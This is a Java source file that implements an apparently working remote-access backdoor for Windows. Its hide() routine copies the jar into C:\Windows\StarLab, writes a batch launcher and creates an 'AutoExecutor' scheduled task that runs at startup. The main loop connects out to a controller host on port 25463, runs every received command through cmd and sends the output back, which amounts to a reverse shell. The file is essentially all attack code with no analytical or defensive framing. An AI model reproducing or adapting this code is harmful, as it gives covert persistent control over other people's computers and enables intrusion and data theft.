package com.jeiel.util;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class Executor {
	private static final String CONTROLLER_HOST_NAME = "hlsang-PC";
	private static int CONTROLLER_PORT = 25463;
	private static String DIR_PATH = "C:\\Windows\\StarLab\\";
	private static String TARGET_FILENAME = "havefun.jar";
	private static String BATCH_NAME = "havefun.bat";
	
	private static Socket client = null;
	private static DataOutputStream dos = null;
	private static DataInputStream dis = null;
	
	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub
		if(hide().equals("no_need")){
			//System.out.println("no_need");
			//Runtime.getRuntime().exec("cmd /c msg %username% Hello %username%, just for fun!\nForget about it.");
			establishConnection();
			if(client!=null){
				waitForCommand();
			}
			close();
		}else{
			//Runtime.getRuntime().exec("cmd /c schtasks /run /tn \"AutoExecutor\"");
			getCMDReturnMsg("schtasks /run /tn \"AutoExecutor\"");
			//System.out.println(getCMDReturnMsg("schtasks /run /tn \"AutoExecutor\""));

		}
		System.out.println("Exit");
	}
	
	public static void establishConnection(){
		while(true){
			try {
				System.out.println("Establishing Connection...");
				client = new Socket(CONTROLLER_HOST_NAME, CONTROLLER_PORT);
				dis = new DataInputStream(client.getInputStream());
				dos = new DataOutputStream(client.getOutputStream());
				System.out.println("Connected");
				break;
			} catch (Exception e) {
				System.out.println(e.getLocalizedMessage());
				System.out.println("Retry in 10s...");
			}
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
	}

	public static void waitForCommand(){
		while(true){
			try{
				System.out.println("Waiting for command...");
				String cmd = receiveCommand();
				if(cmd.equals("EXIT")){
					return;
				}else if(cmd.equals("RESET")){
					System.out.println("Resetting connection...");
					establishConnection();
					continue;
				}
				String result = getCMDReturnMsg(cmd);
				//System.out.println(result);
				sendExecuteResult(result);
				Runtime.getRuntime().exec("cmd /c msg %username% "+cmd);
			}catch(Exception e){
				e.printStackTrace();
			}
		}
	}

	public static String getCMDReturnMsg(String cmd){
		if(cmd==null||cmd.length()==0) return "nothing";
		try{
			//System.out.println("Executing: cmd /c " + cmd);
			Process p = Runtime.getRuntime().exec("cmd /c " + cmd);
			InputStream is = p.getInputStream();
			StringBuilder msg = new StringBuilder();
			byte[] b = new byte[1024];
			int len = 0;
			while((len=is.read(b))>0){
				msg.append(new String(b, 0, len,"GBK"));
			}
			//Runtime.getRuntime().exec("cmd /c msg %username% "+msg.toString());
			//System.out.println(msg.toString());
			return msg.toString();
			//return "lalala";
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "error";
	}
	
	public static String receiveCommand(){
		try{
			String cmd = dis.readUTF();
			return cmd;
		}catch(Exception e){
			if(e.getLocalizedMessage().equals("Connection reset")||e.getLocalizedMessage().equals("Accept timed out")){
				System.out.println(e.getLocalizedMessage());
				return "RESET";
			}else{
				e.printStackTrace();
			}
		}
		return "";
	}
	
	public static void sendExecuteResult(String msg){
		if(msg==null)return;
		try{
			
			System.out.println("Sending back result...");
			dos.writeUTF(msg);
			dos.flush();
		}catch(Exception e){
			if(e.getLocalizedMessage().equals("Socket is closed")){
				System.out.println(e.getLocalizedMessage());
				establishConnection();
			}else{
				e.printStackTrace();
			}
		}
	}
	
	public static void close(){
		try {
			if(client!=null){
				client.close();
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public static String hide(){
		String sourceFileName = System.getProperty("java.class.path");
		File targetDir = new File(DIR_PATH);
		File sourceFile = new File(sourceFileName);
		File targetFile = new File(DIR_PATH, TARGET_FILENAME);
		//System.out.println(sourceFile.getAbsolutePath());
		if(sourceFile.getAbsolutePath().toLowerCase().startsWith(DIR_PATH.toLowerCase())){
			return "no_need";
		}
		if(!targetDir.exists()){
			targetDir.mkdirs();
		}
		try(FileInputStream fis = new FileInputStream(sourceFile);
				FileOutputStream fos = new FileOutputStream(targetFile)){
			int len = 0;
			byte[] b = new byte[10240];
			while((len=fis.read(b))>0){
				fos.write(b, 0, len);
			}
			createBatch();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
	
	public static void createBatch(){
		File file = new File(DIR_PATH,BATCH_NAME);
		try{
			if(!file.exists()){
				file.createNewFile();
			}
			FileOutputStream fos = new FileOutputStream(file);
			fos.write(("start javaw -jar "+DIR_PATH+TARGET_FILENAME + "\r\nexit").getBytes());
			fos.flush();
			fos.close();
			String deleteSchtasks = "schtasks /delete /tn \"AutoExecutor\" /f";
			//Runtime.getRuntime().exec("cmd /c "+deleteSchtasks);
			getCMDReturnMsg(deleteSchtasks);
			String schtasksStr = "schtasks /create /tn \"AutoExecutor\" /tr  \""+DIR_PATH+BATCH_NAME+"\" /sc onstart";
			//Runtime.getRuntime().exec("cmd /c "+schtasksStr);
			getCMDReturnMsg(schtasksStr);
		}catch (Exception e) {
			// TODO: handle exception
		}
		
	}
}
